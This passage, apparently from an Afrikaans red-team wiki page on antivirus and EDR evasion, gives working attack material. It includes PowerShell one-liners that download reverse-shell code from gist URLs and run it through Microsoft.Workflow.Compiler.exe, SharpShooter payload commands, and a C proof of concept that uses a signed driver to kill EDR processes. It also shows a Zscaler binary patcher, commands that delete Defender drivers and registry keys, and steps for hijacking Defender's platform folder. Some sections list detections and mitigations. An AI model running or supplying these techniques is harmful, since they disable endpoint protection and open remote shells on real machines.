                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# met behulp van die samesteller

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lys van C#-obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik van Python vir 'n voorbeeld van injector-bou:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander nutsgoed

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Skakel AV/EDR vanuit Kernel Space uit

Storm-2603 het ’n klein konsolehulpmiddel genaamd **Antivirus Terminator** gebruik om eindpuntbeskerming te deaktiveer voordat ransomware laat val is. Die hulpmiddel bring sy **eie kwesbare maar *ondertekende* driver** saam en misbruik dit om bevoorregte kernel-bewerkings uit te voer wat selfs AV-dienste met Protected-Process-Light (PPL) nie kan blokkeer nie.<sup>[[12]](#references)</sup>

Belangrike punte
1. **Ondertekende driver**: Die lêer wat na die skyf geskryf word, is `ServiceMouse.sys`, maar die binêre lêer is die wettig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs se “System In-Depth Analysis Toolkit”. Omdat die driver ’n geldige Microsoft-handtekening het, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Diensinstallasie**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die eerste reël registreer die driver as ’n **kernel-diens**, en die tweede begin dit sodat `\\.\ServiceMouse` vanaf userland toeganklik word.
3. **IOCTL’s wat deur die driver blootgestel word**
   | IOCTL-kode | Funksionaliteit                         |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beëindig ’n arbitrêre proses volgens PID (word gebruik om Defender/EDR-dienste te beëindig) |
   | `0x990000D0` | Vee ’n arbitrêre lêer op die skyf uit |
   | `0x990001D0` | Laai die driver af en verwyder die diens |

   Minimale C-proof of concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Waarom dit werk**: BYOVD omseil gebruikersmodus-beskermings heeltemal; kode wat in die kern uitvoer, kan *beskermde* prosesse oopmaak, beëindig of met kernobjekte peuter, ongeag PPL/PP, ELAM of ander verhardingskenmerke.

Opsporing / Versagting
•  Aktiveer Microsoft se kwesbare-drywerblokkeerlys (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.
•  Monitor die skepping van nuwe *kern*-dienste en waarsku wanneer ’n drywer vanaf ’n wêreldskryfbare gids gelaai word of nie op die toegangslys voorkom nie.
•  Hou dop vir gebruikersmodus-handvatsels na pasgemaakte toestelobjekte, gevolg deur verdagte `DeviceIoControl`-oproepe.

### Omseiling van Zscaler Client Connector se houdingskontroles deur binêre lêers op skyf te wysig

Zscaler se **Client Connector** pas toestelhoudingsreëls plaaslik toe en maak staat op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpkeuses maak ’n volledige omseiling moontlik:

1. Houdingsevaluering vind **heeltemal aan die kliëntkant** plaas (’n boolean word na die bediener gestuur).
2. Interne RPC-eindpunte valideer slegs dat die verbindende uitvoerbare lêer **deur Zscaler onderteken is** (via `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Deur **vier ondertekende binêre lêers op skyf te wysig** kan albei meganismes geneutraliseer word:

| Binêre lêer | Oorspronklike logika wat gewysig word | Resultaat |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug, sodat elke kontrole voldoen |
| `ZSAService.exe` | Indirekte oproep na `WinVerifyTrust` | NOP-ed ⇒ enige proses (selfs een wat nie onderteken is nie) kan aan die RPC-pipes koppel |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integriteitskontroles op die tonnel | Kortgesluit |

Uittreksel uit ’n minimale patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Nadat die oorspronklike lêers vervang is en die diensstapel herbegin is:

* **Alle** houdingstoetse vertoon **groen/voldoenend**.
* Ongemerkte of gewysigde binaries kan die benoemde-pyp-RPC-eindpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer kry onbeperkte toegang tot die interne netwerk wat deur die Zscaler-beleide gedefinieer word.

Hierdie gevallestudie wys hoe suiwer kliëntkant-vertrouensbesluite en eenvoudige handtekeningkontroles met ’n paar greep-lappies omseil kan word.

## Microsoft Defender `BTR.sys` misbruik van vertroude funksionaliteit

Defender se **Boot-Time Removal**-drywer is ’n nuttige teenvoorbeeld van klassieke BYOVD. `BTR.sys` is ’n wettige Microsoft-ondertekende remediëringskomponent sonder ’n geheuekorrupsieprobleem en sonder ’n IOCTL-koppelvlak; nadat administrateurtoegang en `SeLoadDriverPrivilege` verkry is, kan ’n operateur eerder sy private remediëringstransaksie vervals en die bedoelde Ring-0-lêer-/registerbewerkings uitvoer. Dit is ’n **AV/EDR-neutraliseringsprimitief ná kompromittering, nie aanvanklike toegang of voorregte-eskalasie nie**, en die drywer kan uit die teiken se eie `MpEngine.dll`-hulpbron `BOOTTIMETOOL` onttrek word, eerder as om ’n opvallende derdeparty-drywer in te voer.<sup>[[36]](#references)</sup>

### Voorbereiding van die eenmalige drywer

Defender laat die hulpbron gewoonlik as ’n ewekansige `[a-z]{8}.sys`-lêer val en registreer ’n kerneldiens met ’n soortgelyke naam. `DriverEntry` lees die diens se `Args`-waarde, maak die verwysde NTFS ADS oop, dekripteer en valideer die aksielys, skryf terugvoer en gee `0xC0000056` (`STATUS_DELETE_PENDING`) terug ná suksesvolle uitvoering sodat die drywer ontlaai in plaas daarvan om inwonend te bly. ’n Vervalste diens het die volgende kenmerkende waardes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Die `:changelist`-stroom bevat een RC4-geënkripteerde blob. Die geanaliseerde builds hergebruik ’n vaste 256-greep-sleutel, dus is enkripsie nie ’n magtigingsgrens nie. ’n Geldige plaintext het ’n globale opskrif van 24 grepe (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, opskrif-CRC en ’n transaksie-ID wat van die payload afgelei is), gevolg deur ’n nulbeëindigde UTF-16-terugvoerpad en enige aantal items. Elke item het ’n opskrif van 16 grepe (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) plus aksiespesifieke data wat eindig met **presies vier NUL-grepe**. Elke opskrif-/datastreek word onafhanklik nagegaan met CRC-32-polinoom `0xEDB88320`, aanvangstoestand `0xFFFFFFFF` en **geen finale XOR** (`~CRC32`); die CRC-toestand word vir elke streek teruggestel.<sup>[[36]](#references)[[37]](#references)</sup>

Die aanvaarde aksie-ID’s stel hierdie kernel-primitiewe beskikbaar.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Itemdata | Resultaat |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Vee ’n lêer uit, insluitend ’n geslote lêer |
| 2 | `[UTF-16 path]` | Verwyder ’n leë gids |
| 3 | `[Flags][source][destination]` | Skuif ’n lêer na ’n deur die aanvaller gekose beskermde pad; ’n leë bestemming beteken uitvee |
| 4 | `[Flags][key path]` | Vee ’n registersleutel rekursief uit |
| 5 | `[Flags][key path + "\\" + value]` | Vee ’n registerwaarde uit |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Skep/bywerk ’n registerwaarde en skep ontbrekende sleutelpaadjies |

Vir aksies 5 en 6 is die skeidingsteken tussen sleutel en waarde op die wire **twee opeenvolgende backslashes**; ’n konvensioneel geformateerde pad sal nie korrek opgebreek word nie. Die terugvoerlêer weerspieël meestal die versoek, maar die eerste vier datagrepe van elke item word die resulterende `NTSTATUS`. Vir aksies 1 en 2, wat geen voorste vlagveld het nie, skuif BTR die pad na die vier gereserveerde agterste grepe om plek vir daardie status te maak.<sup>[[36]](#references)</sup>

### `BTR_CLI`-werkvloei en vroeë selflaaivenster

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementeer die volledige ketting: onttrek `BTR.sys` uit plaaslike Defender, skep `<random>.sys:changelist` en ’n terugvoerstroom, serialiseer/kontroleer die checksums/kripteer gekoppelde aksies, skep die diensregistersleutel direk en roep dan `NtLoadDriver` aan vir `-trigger now`, of laat dit as ’n stelselbegin-drywer vir `-trigger boot`. Direkte registervoorbereiding omseil die normale SCM-`CreateServiceW`-pad en veroorsaak dus **nie** diensinstallasiegebeurtenis-ID 7045 nie. Artefakte wat met ’n selflaai-sneller geskep is, kan later verwyder word met `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` is nie bruikbaar nie omdat BTR lêer-I/O vanaf `DriverEntry` uitvoer voordat die stoorgroep en `SystemRoot`-skakel gereed is. `Start=1` plus die hoëprioriteit-`Boot Bus Extender`-groep voer eerder in Fase 1 uit: NTFS is bruikbaar, maar baie sekuriteitsdrivers wat tydens stelselstart laai en EDR-dienste in gebruikersmodus het nog nie geïnisialiseer nie. Boot-start-filters soos `WdFilter` is dalk reeds gelaai, maar BTR kan hul binaries of dienskonfigurasie verwyder voor die volgende start en kan diensuitvoerbare lêers skrap voordat SCM hulle begin. ELAM maak nie hierdie gaping toe nie omdat BTR ná die boot-start-evaluering loop en ’n geldige Microsoft-handtekening het.<sup>[[36]](#references)</sup>

Verskeie aksies word in een transaksie uitgevoer. Die PoC voeg Aksie 1 voor vir die hardgekodeerde `\SystemRoot\Temp\BootClean.log`: BTR skep hierdie log, verwerk dan sy eie skrapversoek en verwyder dit voordat dit ontlaai. Dit verminder die bewyse, terwyl terugvoer in `<random>.sys:<random>.dat` geplaas kan word sodat die driver en albei strome saam verwyder kan word.<sup>[[36]](#references)[[37]](#references)</sup>

### Hoësein-korrelasies vir opsporing

Reëls wat net op handtekeninge gebaseer is en die Microsoft-lys van geblokkeerde kwesbare drivers spreek nie misbruik van BTR se bedoelde funksionaliteit aan nie. Verkies hierdie gedragskorrelasies, en onderskei terselfdertyd legitieme Defender-afstamming van ’n arbitrêre lanseerder.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Skepping van `.sys:changelist` is universeel vir BTR-staging. ’n `.dat` ADS wat aan dieselfde `.sys` gekoppel is, is besonder verdag omdat legitieme Defender terugvoer gewoonlik onder `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` plaas.
- **Sysmon 12/13 sonder System 7045:** korreleer direkte skepping van `HKLM\SYSTEM\CurrentControlSet\Services\<random>` met `Args=...:changelist` en `Group=Boot Bus Extender`, sonder ’n ooreenstemmende SCM-installasiegebeurtenis.
- **Sysmon 6 -> 23:** korreleer ’n bekende BTR-driverlaaiing uit ’n nie-Defender-afstamming met daaropvolgende lêerskraping wat aan `System`/PID 4 toegeskryf word, veral vir sekuriteitsbinaries.
- **Sysmon 11 -> 23:** waarsku oor die vinnige skepping en skraping van `\SystemRoot\Temp\BootClean.log` deur `System`/PID 4.
- Beperk en oudit die toekenning/aktivering van `SeLoadDriverPrivilege`; ’n Microsoft-handtekening alleen bied nie voldoende vertroue wanneer ’n sekuriteitnutsmiddel se driver deur `cmd.exe`, PowerShell of ’n onbekende proses gestage word nie.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te peuter

Protected Process Light (PPL) dwing ’n hiërargie van ondertekenaars/vlakke af sodat slegs beskermde prosesse van gelyke of hoër vlak met mekaar kan peuter. Aanvallend gesproke, as jy ’n PPL-geaktiveerde binary wettig kan begin en die argumente daarvan kan beheer, kan jy onskadelike funksionaliteit (bv. aantekening) omskep in ’n beperkte, PPL-gesteunde skryfprimitief teen beskermde gidse wat deur AV/EDR gebruik word.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Wat ’n proses as PPL laat loop
- Die teiken-EXE (en enige gelaaide DLL’s) moet met ’n PPL-geskikte EKU onderteken wees.
- Die proses moet met CreateProcess geskep word deur die vlae te gebruik: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- ’n Versoenbare beskermingsvlak moet aangevra word wat met die binary se ondertekenaar ooreenstem (bv. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` vir anti-malware-ondertekenaars, `PROTECTION_LEVEL_WINDOWS` vir Windows-ondertekenaars). Verkeerde vlakke sal tydens skepping misluk.

Sien ook hier ’n breër inleiding tot PP/PPL en LSASS-beskerming:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Lanseerdernutsmiddels
- Oopbronhulpmiddel: CreateProcessAsPPL (kies die beskermingsvlak en stuur argumente deur na die teiken-EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Gebruikspatroon:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN-primitief: ClipUp.exe
- Die ondertekende stelselbinary `C:\Windows\System32\ClipUp.exe` begin ’n nuwe instansie van homself en aanvaar ’n parameter om ’n loglêer na ’n pad wat deur die oproeper gespesifiseer word, te skryf.
- Wanneer dit as ’n PPL-proses geloods word, vind die lêerskrywing met PPL-beskerming plaas.
- ClipUp kan nie paaie met spasies ontleed nie; gebruik 8.3-kortpaaie om na normaalweg beskermde liggings te verwys.

8.3-kortpad-hulpmiddels
- Lys kortname: `dir /x` in elke ouergids.
- Bepaal die kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruikketting (abstrak)
1) Loods die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur ’n lanseerder (bv. CreateProcessAsPPL) te gebruik.
2) Gee ClipUp die logpad-argument om ’n lêer in ’n beskermde AV-gids (bv. Defender Platform) te skep. Gebruik 8.3-kortname indien nodig.
3) As die AV die teikenbinary gewoonlik oop of gesluit hou terwyl dit loop (bv. MsMpEng.exe), skeduleer die skrywing tydens selflaai, voordat die AV begin, deur ’n outomatiese diens te installeer wat betroubaar vroeër loop. Bevestig die selflaaivolgorde met Process Monitor (selflaailogging).
4) Met die herlaai vind die PPL-beskermde skrywing plaas voordat die AV sy binaries sluit, wat die teikenlêer beskadig en verhoed dat dit begin.

Voorbeeld-aanroep (paaie vir veiligheid weggelaat/verkort):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Aantekeninge en beperkings
- Jy kan nie beheer wat ClipUp skryf nie, behalwe waar dit geskryf word; hierdie primitive is geskik vir korrupsie eerder as presiese inhoudinspuiting.
- Plaaslike admin/SYSTEM is nodig om ’n diens te installeer/te begin, asook ’n herlaaivenster.
- Tydsberekening is krities: die teiken moet nie oop wees nie; uitvoering tydens selflaai vermy lêerslotte.

Opsporings
- Proseskepping van `ClipUp.exe` met ongewone argumente, veral wanneer dit deur nie-standaard launchers as ouerproses begin word, rondom selflaai.
- Nuwe dienste wat op outomatiese begin ingestel is, verdagte binaries gebruik en konsekwent voor Defender/AV begin. Ondersoek dienskepping/-wysiging wat plaasvind voordat Defender se opstart misluk.
- Lêerintegriteitsmonitering op Defender-binaries/Platform-gidse; onverwagte lêerskeppings/-wysigings deur prosesse met beskermde-prosesvlae.
- ETW/EDR-telemetrie: soek na prosesse wat met `CREATE_PROTECTED_PROCESS` geskep is en abnormale PPL-vlakgebruik deur nie-AV-binaries.

Versagtings
- WDAC/Code Integrity: beperk watter ondertekende binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroep buite wettige kontekste.
- Dienshigiëne: beperk die skep/wysiging van dienste wat outomaties begin en monitor manipulasie van beginvolgorde.
- Maak seker dat Defender se tamper protection en vroeëlaaibeskerming geaktiveer is; ondersoek opstartfoute wat op binêre korrupsie dui.
- Oorweeg dit om 8.3-kortnaamskepping te deaktiveer op volumes waarop sekuriteitsnutsgoed gehuisves word, indien dit met jou omgewing versoenbaar is (toets deeglik).

## Peuter met Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender kies die platform waarvandaan dit loop deur subgidse onder die volgende pad op te som:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Dit kies die subgids met die hoogste leksikografiese weergawestring (bv. `4.18.25070.5-0`) en begin dan die Defender-diensprosesse daarvandaan (waarby diens-/registerpaaie dienooreenkomstig opgedateer word). Hierdie keuse vertrou op gidsinskrywings, insluitend gids-reparse points (symlinks). ’n Administrateur kan dit benut om Defender na ’n pad te herlei wat deur ’n aanvaller geskryf kan word en DLL-sideloading of diensontwrigting te bewerkstellig.<sup>[[21]](#references)[[22]](#references)</sup>

Voorvereistes
- Plaaslike Administrator (nodig om gidse/symlinks onder die Platform-gids te skep)
- Die vermoë om te herlaai of Defender se platformherkeuse te aktiveer (diensherbegin tydens selflaai)
- Slegs ingeboude nutsgoed nodig (mklink)

Waarom dit werk
- Defender blokkeer skryfbewerkings in sy eie gidse, maar sy platformkeuse vertrou op gidsinskrywings en kies die leksikografies hoogste weergawe sonder om te valideer of die teiken na ’n beskermde/vertroude pad herlei.

Stap vir stap (voorbeeld)
1) Berei ’n skryfbare kloon van die huidige platformgids voor, bv. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Skep ’n directory symlink met ’n hoër weergawe binne Platform wat na jou gids wys:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Snellerkeuse (herlaai word aanbeveel):
```cmd
shutdown /r /t 0
```
4) Verifieer dat MsMpEng.exe (WinDefend) vanaf die omgeleide pad loop:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Jy behoort die nuwe prosespad onder `C:\TMP\AV\` te sien, asook die dienskonfigurasie/register wat na daardie ligging verwys.

Post-exploitation-opsies
- DLL sideloading/code execution: Plaas/vervang DLLs wat Defender uit sy toepassingsgids laai om code in Defender se prosesse uit te voer. Sien die afdeling hierbo: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Diensafsluiting/ontsegging: Verwyder die weergawe-simskakel sodat die gekonfigureerde pad met die volgende begin nie opgelos word nie en Defender nie kan begin nie:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Let daarop dat hierdie tegniek nie op sigself voorregte-eskalasie bied nie; dit vereis adminregte.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams kan runtime-evasion uit die C2-implantaat verskuif na die teikenmodule self deur sy Import Address Table (IAT) te hook en geselekteerde API's deur aanvallerbeheerde, posisie-onafhanklike kode (PIC) te stuur. Dit veralgemeen evasion buite die klein API-oppervlak wat baie kits blootstel (bv. CreateProcessA), en brei dieselfde beskerming uit na BOFs en post-exploitation-DLL's.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Hoëvlakbenadering
- Staging 'n PIC-blob saam met die teikenmodule deur 'n reflektiewe loader te gebruik (voorafgevoeg of as metgesel). Die PIC moet selfstandig en posisie-onafhanklik wees.
- Wanneer die gasheer-DLL laai, loop deur sy IMAGE_IMPORT_DESCRIPTOR en patch die IAT-inskrywings vir geteikende imports (bv. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) sodat hulle na dun PIC-wrappers wys.
- Elke PIC-wrapper voer evasion-tegnieke uit voordat dit die regte API-adres aanroep. Tipiese evasion-tegnieke sluit in:
  - Geheuemaskering/-ontmaskering rondom die aanroep (bv. enkripteer beacon-streke, RWX→RX, verander bladsynaam/-toestemmings) en herstel dit daarna.
  - Call-stack spoofing: bou 'n onskadelike stack en skakel oor na die teiken-API sodat call-stack-analise die verwagte rame vind.<sup>[[9]](#references)</sup>
- Voer vir versoenbaarheid 'n koppelvlak uit sodat 'n Aggressor-script (of ekwivalent) kan registreer watter API's vir Beacon, BOFs en post-ex-DLL's ge-hook moet word.

Waarom IAT-hooking hier
- Werk vir enige kode wat die ge-hookte import gebruik, sonder om tool-kode te wysig of op Beacon staat te maak om spesifieke API's te proxy.
- Dek post-ex-DLL's: deur LoadLibrary* te hook, kan jy modulelaaie onderskep (bv. System.Management.Automation.dll, clr.dll) en dieselfde maskering-/stack-evasion op hul API-aanroepe toepas.
- Herstel betroubare gebruik van post-ex-opdragte wat prosesse skep, teen call-stack-gebaseerde opsporing deur CreateProcessA/W te wrap.

Minimale IAT-hook-skets (x64 C/C++-pseudokode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Pas die patch toe ná relocations/ASLR en vóór die import die eerste keer gebruik word. Reflective loaders soos TitanLdr/AceLdr wys hoe hooking tydens DllMain van die gelaaide module uitgevoer kan word.
- Hou wrappers klein en PIC-safe; verkry die ware API via die oorspronklike IAT-waarde wat jy vasgelê het voordat jy die patch toepas, of via LdrGetProcedureAddress.
- Gebruik RW → RX-oorgange vir PIC en moenie bladsye as writable+executable laat nie.

Call-stack spoofing stub
- Draugr-styl PIC-stubs bou ’n vals call chain (return addresses in benign modules) en spring dan na die ware API.
- Dit omseil detections wat kanonieke stacks van Beacon/BOFs na sensitiewe APIs verwag.
- Kombineer dit met stack cutting/stack stitching-tegnieke om binne verwagte frames te land voordat die API-prologue begin.

Operasionele integrasie
- Plaas die reflective loader vooraan in post-ex DLLs sodat die PIC en hooks outomaties initialiseer wanneer die DLL gelaai word.
- Gebruik ’n Aggressor-script om teiken-APIs te registreer sodat Beacon en BOFs deursigtig by dieselfde evasion path baat vind, sonder kodeveranderinge.

Opsporing/DFIR-oorwegings
- IAT-integriteit: entries wat na nie-image (heap/anon)-adresse resolve; periodieke verifikasie van import pointers.
- Stack-anomalieë: return addresses wat nie aan gelaaide images behoort nie; skielike oorgange na nie-image PIC; onbestendige RtlUserThreadStart-voorouers.
- Loader-telemetrie: in-process-skrywes na IAT; vroeë DllMain-aktiwiteit wat import thunks wysig; onverwagte RX-regions wat tydens laai geskep word.
- Image-load-evasion: monitor verdagte loads van automation/clr-assemblies wat met memory masking events saamhang as jy LoadLibrary* hook.

Verwante boublokke en voorbeelde
- Reflective loaders wat IAT-patching tydens laai uitvoer (bv. TitanLdr, AceLdr)
- Memory masking-hooks (bv. simplehook) en stack-cutting PIC (stackcutting)
- PIC call-stack spoofing-stubs (bv. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via ’n resident PICO

As jy ’n reflective loader beheer, kan jy imports **tydens** `ProcessImports()` hook deur die loader se `GetProcAddress`-pointer met ’n pasgemaakte resolver te vervang wat eers hooks nagaan:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Bou ’n **resident PICO** (persistent PIC object) wat bly bestaan nadat die transient loader PIC homself vrygestel het.
- Export ’n `setup_hooks()`-funksie wat die loader se import resolver oorskryf (bv. `funcs.GetProcAddress = _GetProcAddress`).
- Slaan ordinal imports oor in `_GetProcAddress` en gebruik ’n hash-gebaseerde hook-opsoek soos `__resolve_hook(ror13hash(name))`. As ’n hook bestaan, gee dit terug; anders, delegeer na die werklike `GetProcAddress`.
- Registreer hook-teikens tydens link time met Crystal Palace `addhook "MODULE$Func" "hook"`-inskrywings. Die hook bly geldig omdat dit binne die resident PICO woon.

Dit lewer **import-time IAT-redirection** sonder om die gelaaide DLL se code section ná laai te patch.

### Hookable imports afdwing wanneer die teiken PEB-walking gebruik

Import-time hooks word net geaktiveer as die funksie werklik in die teiken se IAT voorkom. As ’n module APIs via ’n PEB-walk + hash resolve (sonder ’n import entry), dwing ’n werklike import af sodat die loader se `ProcessImports()`-pad dit kan sien:

